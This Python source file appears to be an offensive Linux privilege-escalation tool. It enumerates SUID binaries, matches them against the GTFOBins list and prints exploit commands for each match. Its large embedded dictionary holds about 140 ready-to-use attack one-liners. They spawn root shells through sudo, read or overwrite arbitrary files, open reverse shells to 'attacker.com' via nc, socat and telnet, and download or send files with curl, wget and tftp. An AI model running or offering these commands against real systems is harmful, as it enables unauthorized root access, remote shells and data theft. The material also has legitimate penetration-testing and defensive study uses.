#!/usr/bin/python3

"""
Works with both python2 & python 3
"""

import os

myDict={'apt-get': 'sudo apt-get changelog apt\n!/bin/sh', 'apt': 'sudo apt-get changelog apt\n!/bin/sh', 'aria2c': 'COMMAND=\'id\'\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x', 'arp': 'LFILE=file_to_read\nsudo arp -v -f "$LFILE"', 'ash': 'sudo ash', 'awk': 'sudo awk \'BEGIN {system("/bin/sh")}\'', 'base64': 'LFILE=file_to_read\nsudo base64 "$LFILE" | base64 --decode', 'bash': 'sudo bash', 'busybox': 'sudo busybox sh', 'cancel': 0, 'cat': 'LFILE=file_to_read\nsudo cat "$LFILE"', 'chmod': 'LFILE=file_to_change\nsudo chmod 0777 $LFILE', 'chown': 'LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE', 'cp': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\nsudo cp $TF $LFILE', 'cpan': "sudo cpan\n! exec '/bin/bash'", 'cpulimit': 'sudo cpulimit -l 100 -f /bin/sh', 'crontab': 'sudo crontab -e', 'csh': 'sudo csh', 'curl': 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo -E curl $URL -o $LFILE', 'cut': 'LFILE=file_to_read\nsudo cut -d "" -f1 "$LFILE"', 'dash': 'sudo dash', 'date': 'LFILE=file_to_read\nsudo date -f $LFILE', 'dd': 'LFILE=file_to_write\necho "data" | sudo -E dd of=$LFILE', 'diff': 'LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE', 'dmesg': 'sudo dmesg -H\n!/bin/sh', 'dmsetup': "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'", 'dnf': "TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n", 'docker': 'sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh', 'dpkg': "TF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n", 'easy_install': 'TF=$(mktemp -d)\necho "import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'sh <$(tty) >$(tty) 2>$(tty)\')" > $TF/setup.py\nsudo easy_install $TF', 'ed': 'sudo ed\n!/bin/sh', 'emacs': 'sudo emacs -Q -nw --eval \'(term "/bin/sh")\'', 'env': 'sudo env /bin/sh', 'expand': 'LFILE=file_to_read\nsudo expand "$LFILE"', 'expect': "sudo expect -c 'spawn /bin/sh;interact'", 'facter': 'TF=$(mktemp -d)\necho \'exec("/bin/sh")\' > $TF/x.rb\nFACTERLIB=$TF sudo -E facter', 'file': 'LFILE=file_to_read\nsudo file -m $LFILE', 'find': 'sudo find . -exec /bin/sh \\; -quit', 'finger': 0, 'flock': 'sudo flock -u / /bin/sh', 'fmt': 'LFILE=file_to_read\nsudo fmt -pNON_EXISTING_PREFIX "$LFILE"', 'fold': 'LFILE=file_to_read\nsudo fold -w99999999 "$LFILE"', 'ftp': 'sudo ftp\n!/bin/sh', 'gawk': 'sudo gawk \'BEGIN {system("/bin/sh")}\'', 'gdb': "sudo gdb -nx -ex '!sh' -ex quit", 'gimp': 'sudo gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.system("sh")\'', 'git': 'PAGER=\'sh -c "exec sh 0<&1"\' sudo -E git -p help', 'grep': "LFILE=file_to_read\nsudo grep '' $LFILE", 'head': 'LFILE=file_to_read\nsudo head -c1G "$LFILE"', 'iftop': 'sudo iftop\n!/bin/sh', 'ionice': 'sudo ionice /bin/sh', 'ip': 'LFILE=file_to_read\nsudo ip -force -batch "$LFILE"', 'irb': "sudo irb\nexec '/bin/bash'", 'jjs': 'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)\').waitFor()" | sudo jjs', 'journalctl': 'sudo journalctl\n!/bin/sh', 'jq': 'LFILE=file_to_read\nsudo jq -Rr . "$LFILE"', 'jrunscript': 'sudo jrunscript -e "exec(\'/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)\')"', 'ksh': 'sudo ksh', 'ld.so': 'sudo /lib/ld.so /bin/sh', 'ldconfig': 'TF=$(mktemp -d)\necho "$TF" > "$TF/conf"\n# move malicious libraries in $TF\nsudo ldconfig -f "$TF/conf"', 'less': 'sudo less /etc/profile\n!/bin/sh', 'logsave': 'sudo logsave /dev/null /bin/sh -i', 'ltrace': 'sudo ltrace -b -L /bin/sh', 'lua': 'sudo lua -e \'os.execute("/bin/sh")\'', 'mail': "sudo mail --exec='!/bin/sh'", 'make': 'COMMAND=\'/bin/sh\'\nsudo make -s --eval=$\'x:\\n\\t-\'"$COMMAND"', 'man': 'sudo man man\n!/bin/sh', 'mawk': 'sudo mawk \'BEGIN {system("/bin/sh")}\'', 'more': 'TERM= sudo -E more /etc/profile\n!/bin/sh', 'mount': 'sudo mount -o bind /bin/sh /bin/mount\nsudo mount', 'mtr': 'LFILE=file_to_read\nsudo mtr --raw -F "$LFILE"', 'mv': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\nsudo mv $TF $LFILE', 'mysql': "sudo mysql -e '\\! /bin/sh'", 'nano': 'sudo nano\n^R^X\nreset; sh 1>&0 2>&0', 'nawk': 'sudo nawk \'BEGIN {system("/bin/sh")}\'', 'nc': 'RHOST=attacker.com\nRPORT=12345\nsudo nc -e /bin/sh $RHOST $RPORT', 'nice': 'sudo nice /bin/sh', 'nl': "LFILE=file_to_read\nsudo nl -bn -w1 -s '' $LFILE", 'nmap': 'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\nsudo nmap --script=$TF', 'node': 'sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]});\'', 'od': 'LFILE=file_to_read\nsudo od -An -c -w9999 "$LFILE"', 'openssl': 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n', 'perl': 'sudo perl -e \'exec "/bin/sh";\'', 'pg': 'sudo pg /etc/profile\n!/bin/sh', 'php': 'CMD="/bin/sh"\nsudo php -r "system(\'$CMD\');"', 'pic': 'sudo pic -U\n.PS\nsh X sh X', 'pico': 'sudo pico\n^R^X\nreset; sh 1>&0 2>&0', 'pip': 'TF=$(mktemp -d)\necho "import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'sh <$(tty) >$(tty) 2>$(tty)\')" > $TF/setup.py\nsudo pip install $TF', 'puppet': 'sudo puppet apply -e "exec { \'/bin/sh -c \\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\"\': }"', 'python': 'sudo python -c \'import os; os.system("/bin/sh")\'', 'readelf': 'LFILE=file_to_read\nsudo readelf -a @$LFILE', 'red': 'sudo red file_to_write\na\nDATA\n.\nw\nq', 'rlogin': 0, 'rlwrap': 'sudo rlwrap /bin/sh', 'rpm': 'sudo rpm --eval \'%{lua:os.execute("/bin/sh")}\'', 'rpmquery': 'sudo rpmquery --eval \'%{lua:posix.exec("/bin/sh")}\'', 'rsync': 'sudo rsync -e \'sh -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null', 'ruby': 'sudo ruby -e \'exec "/bin/sh"\'', 'run-mailcap': 'sudo run-mailcap --action=view /etc/hosts\n!/bin/sh', 'run-parts': "sudo run-parts --new-session --regex '^sh$' /bin", 'rvim': 'sudo rvim -c \':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'', 'scp': 'TF=$(mktemp)\necho \'sh 0<&2 1>&2\' > $TF\nchmod +x "$TF"\nsudo scp -S $TF x y:', 'screen': 'sudo screen', 'script': 'sudo ./script -q /dev/null', 'sed': "sudo sed -n '1e exec sh 1>&0' /etc/hosts", 'service': 'sudo service ../../bin/sh', 'setarch': 'sudo setarch $(arch) /bin/sh', 'sftp': 'HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh', 'shuf': 0, 'smbclient': "sudo smbclient '\\\\attacker\\share'\n!/bin/sh", 'socat': 'RHOST=attacker.com\nRPORT=12345\nsudo -E socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane', 'sort': 'LFILE=file_to_read\nsudo sort -m "$LFILE"', 'sqlite3': "sudo sqlite3 /dev/null '.shell /bin/sh'", 'ssh': "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x", 'start-stop-daemon': 'sudo start-stop-daemon -n $RANDOM -S -x /bin/sh', 'stdbuf': 'sudo stdbuf -i0 /bin/sh', 'strace': 'sudo strace -o /dev/null /bin/sh', 'systemctl': 'TF=$(mktemp)\necho /bin/sh >$TF\nchmod +x $TF\nsudo SYSTEMD_EDITOR=$TF systemctl edit system.slice', 'tail': 'LFILE=file_to_read\nsudo tail -c1G "$LFILE"', 'tar': 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh', 'taskset': 'sudo taskset 1 /bin/sh', 'tclsh': 'sudo tclsh\nexec /bin/sh <@stdin >@stdout 2>@stderr', 'tcpdump': 'COMMAND=\'id\'\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\nsudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root', 'tee': 'LFILE=file_to_write\necho DATA | sudo tee -a "$LFILE"', 'telnet': 'RHOST=attacker.com\nRPORT=12345\nsudo telnet $RHOST $RPORT\n^]\n!/bin/sh', 'tftp': 'RHOST=attacker.com\nsudo -E tftp $RHOST\nput file_to_send', 'time': 'sudo /usr/bin/time /bin/sh', 'timeout': 'sudo timeout --foreground 7d /bin/sh', 'tmux': 'sudo tmux', 'ul': 'LFILE=file_to_read\nsudo ul "$LFILE"', 'unexpand': 'LFILE=file_to_read\nsudo unexpand -t99999999 "$LFILE"', 'uniq': 'LFILE=file_to_read\nsudo uniq "$LFILE"', 'unshare': 'sudo unshare /bin/sh', 'vi': "sudo vi -c ':!/bin/sh' /dev/null", 'vim': "sudo vim -c ':!/bin/sh'", 'watch': "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'", 'wget': 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nsudo -E wget $URL -O $LFILE', 'whois': 0, 'wish': 'sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr', 'xargs': 'sudo xargs -a /dev/null sh', 'xxd': 'LFILE=file_to_read\nsudo xxd "$LFILE" | xxd -r', 'yum': "TF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n", 'zip': "TF=$(mktemp -u)\nsudo zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF", 'zsh': 'sudo zsh', 'zypper': 'sudo zypper x'}

"""
The following list contains all default SUID bins found within Unix
"""

defSUIDBinaries = ['/bin/fusermount', '/bin/mount', '/bin/ping', '/bin/ping6', '/bin/su', '/bin/umount', '/opt/google/chrome/chrome-sandbox', '/sbin/mount.ecryptfs_private', '/sbin/mount.nfs', '/usr/bin/arping', '/usr/bin/at', '/usr/bin/bwrap', '/usr/bin/chfn', '/usr/bin/chsh', '/usr/bin/fusermount', '/usr/bin/gpasswd', '/usr/bin/kismet_capture', '/usr/bin/mount', '/usr/bin/newgidmap', '/usr/bin/newgrp', '/usr/bin/newuidmap', '/usr/bin/ntfs-3g', '/usr/bin/passwd', '/usr/bin/pkexec', '/usr/bin/su', '/usr/bin/sudo', '/usr/bin/traceroute6.iputils', '/usr/bin/ubuntu-core-launcher', '/usr/bin/umount', '/usr/bin/vmware-user-suid-wrapper', '/usr/lib/authbind/helper', '/usr/lib/chromium-browser/chrome-sandbox', '/usr/lib/dbus-1.0/dbus-daemon-launch-helper', '/usr/lib/eject/dmcrypt-get-device', '/usr/lib/openssh/ssh-keysign', '/usr/lib/policykit-1/polkit-agent-helper-1', '/usr/lib/virtualbox/VBoxHeadless', '/usr/lib/virtualbox/VBoxNetAdpCtl', '/usr/lib/virtualbox/VBoxNetDHCP', '/usr/lib/virtualbox/VBoxNetNAT', '/usr/lib/virtualbox/VBoxSDL', '/usr/lib/virtualbox/VBoxVolInfo', '/usr/lib/virtualbox/VirtualBoxVM', '/usr/lib/vmware/bin/vmware-vmx', '/usr/lib/vmware/bin/vmware-vmx-debug', '/usr/lib/vmware/bin/vmware-vmx-stats', '/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic', '/usr/lib/xorg/Xorg.wrap', '/usr/sbin/exim4', '/usr/sbin/mount.cifs', '/usr/sbin/mount.nfs', '/usr/sbin/pppd', '/usr/sbin/vmware-authd', '/usr/share/skypeforlinux/chrome-sandbox']

"""
The following list contains GTFO Bins binaries which are SUID exploitable
"""

gtfoBinsList	= ["aria2c", "arp", "ash", "awk", "base64", "bash", "busybox", "cat", "chmod", "chown", "cp", "csh", "curl", "cut", "dash", "date", "dd", "diff", "dmsetup", "docker", "ed", "emacs", "env", "expand", "expect", "file", "find", "flock", "fmt", "fold", "ftp", "gawk", "gdb", "gimp", "git", "grep", "head", "iftop", "ionice", "ip", "irb", "jjs", "jq", "jrunscript", "ksh", "ld.so", "ldconfig", "less", "logsave", "lua", "make", "man", "mawk", "more", "mtr", "mv", "mysql", "nano", "nawk", "nc", "netcat", "nice", "nl", "nmap", "node", "od", "openssl", "perl", "pg", "php", "pic", "pico", "python", "readelf", "rlwrap", "rpm", "rpmquery", "rsync", "ruby", "run-parts", "rvim", "scp", "script", "sed", "setarch", "sftp", "sh", "shuf", "socat", "sort", "sqlite3", "ssh", "start-stop-daemon", "stdbuf", "strace", "systemctl", "tail", "tar", "taskset", "tclsh", "tee", "telnet", "tftp", "time", "timeout", "ul", "unexpand", "uniq", "unshare", "vi", "vim", "watch", "wget", "wish", "xargs", "xxd", "zip", "zsh"]

"""
Colors List
"""

cyan 	= "\033[0;96m"
green 	= "\033[0;92m"
white 	= "\033[0;97m"
red 	= "\033[0;91m"
blue 	= "\033[0;94m"
yellow 	= "\033[0;33m"
magenta = "\033[0;35m"

barLine = "------------------------------"

banner 	= magenta + "  ___ _   _ _ ___    _____  _ _   _ __  __ \n"
banner += yellow + " / __| | | / |   \\  |__ / \\| | | | |  \\/  |\n"
banner += blue + " \\__ \\ |_| | | |) |  |_ \\ .` | |_| | |\\/| |\n"
banner += red + " |___/\\___/|_|___/  |___/_|\\_|\\___/|_|  |_| " + cyan + " @syed__umar\n"


def listAllSUIDBinaries():
	"""
	Listing all SUID Binaries found in the system
	"""

	print(white + "[" + blue + "#" + white + "] " + yellow + "Finding/Listing all SUID Binaries ..")
	print(white + barLine)
	
	command 	= "find / -perm /4000 2>/dev/null"
	result 		= os.popen(command).read().strip().split("\n")
	
	for bins in result:
		print(yellow + bins)
	
	print(white + barLine + "\n\n")
	return(result)

def doSomethingPlis(listOfSuidBins):
	"""
	This function prints the following data:
		- Default binaries which ship with installation of linux
		- Custom binaries which aren't a part of default list
		- Binaries which match GTFObins list!
	"""

	_bins 			= []
	binsInGTFO 		= []
	customSuidBins 	= []
	defaultSuidBins = []

	for suidBin in listOfSuidBins:
		_bin 	= suidBin[::-1].split("/")[0][::-1]
		if _bin in gtfoBinsList:
			binsInGTFO.append(suidBin)

	for suidBin in listOfSuidBins:
		if not(suidBin in defSUIDBinaries):
			customSuidBins.append(suidBin)

		else:
			defaultSuidBins.append(suidBin)

	print("["+ red + "!" + white + "] Default Binaries (Don't bother)")
	print(barLine)
	for bins in defaultSuidBins: print(blue + bins)
	print(white + barLine + "\n\n")

	print("[" + cyan + "~" + white + "] " + cyan + "Custom SUID Binaries (Interesting Stuff)")
	print(white + barLine)
	for bins in customSuidBins: print(cyan + bins)
	print(white + barLine + "\n\n")

	"""
	QWgsIEkgc2VlIHlvdSdyZSBhIG1hbiBvZiBjdWx0dXJlIGFzIHdlbGwgOkQgCk5vdCBldmVyeW9uZSByZWFkcyBzb3VyY2UgY29kZSBvZiB3aGF0IHRoZXkncmUgcnVubmluZyBub3ctYS1kYXlzIMKvXF8o44OEKV8vwq8K
	"""

	if len(binsInGTFO) != 0:
		print("[" + green + "#" + white + "] " + green + "SUID Binaries in GTFO bins list (Hell Yeah!)")
		print(white + barLine)

		for bin in binsInGTFO:
			pathOfBin 	= os.popen("which " + bin).read().strip() 
			gtfoUrl 	= "https://gtfobins.github.io/gtfobins/" + bin[::-1].split("/")[0][::-1] + "/#suid"
			print(green + pathOfBin + white + " -~> " + magenta + gtfoUrl)
		
		print(white + barLine + "\n\n")

	else:
		print("[" + green + "#" + white + "] " + green + "SUID Binaries found in GTFO bins..")
		print(white + barLine)
		print("[" + red + "!" + white + "] " + magenta + "None " + red + ":(")
		print(white + barLine + "\n\n")

	print("[" + green + "#" + white + "] " + green + "Exploit")
	print(white + barLine)

	for binary in binsInGTFO:
		bName = binary[::-1].split("/")[0][::-1]
		print(green + binary + white + " \n" + myDict[bName])
		print(white + barLine + "\n\n")

def note():
	print(white + "[" + red + "-" + white + "] " + magenta + "Note")
	print(white + barLine)
	print(blue  + "If you see any FP in the output, please report it to make the script better! :)")	
	print(white + barLine + "\n")

def main():
	print(banner)
	try:
		suidBins 	= listAllSUIDBinaries()
		doSomethingPlis(suidBins); note()

	except KeyboardInterrupt:
		print("\n[" + red + "!" + white + "] " + red + "Aye, why you do dis!?")

if __name__ == '__main__':
	main()